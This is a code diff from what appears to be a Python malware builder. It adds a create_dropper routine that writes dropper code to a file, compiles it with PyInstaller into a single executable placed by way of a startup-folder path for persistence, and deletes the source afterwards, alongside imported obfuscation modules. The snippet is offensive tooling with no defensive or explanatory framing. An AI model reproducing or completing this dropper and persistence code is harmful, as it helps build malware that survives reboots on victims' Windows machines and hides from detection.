@@ -3,7 +3,8 @@ import subprocess
 import os
 import random
 import base64
-from Utils.helpers import is_os_64bit,random_string,run_pwsh,is_msvc_exist,download_file,extract_zip,get_current_file_path,base64_encode_file
+from Utils.helpers import is_os_64bit,random_string,run_pwsh,is_msvc_exist,\
+    download_file,extract_zip,get_current_file_path,base64_encode_file,find_python_path
 from .pyinstaller_obfuscate.obfuscationModule.main import Obfuscate
 from .pyinstaller_obfuscate.main import obfuscate_files
 
@@ -69,7 +70,15 @@ def create_dropper():
         system({backup_of_file})
     main()
     """
-    # //TODO: create the py file of the dropper, install it with py installer, and persist it.
+    dropper_py_file = obfuscated_startup_folder.replace('.exe','.py')
+    with open(dropper_py_file,'w') as dropper_file:
+        dropper_file.write(code)
+    check_if_pyinstaller_installed = f"{find_python_path()} -m pip list"
+    if 'pyinstaller' in run_pwsh(check_if_pyinstaller_installed).lower():
+        pyinstaller_path = find_python_path().replace('python.exe','scripts/pyinstaller.exe')
+        install_it = run_pwsh(f"{pyinstaller_path} --onefile --icon=NONE {dropper_py_file}")
+        #//TODO: find a way to check if the install was success or not
+    os.remove(dropper_py_file) #remove the python dropper code.
 
 def get_pyinstaller(pythonPath: str, admin=True):
     """
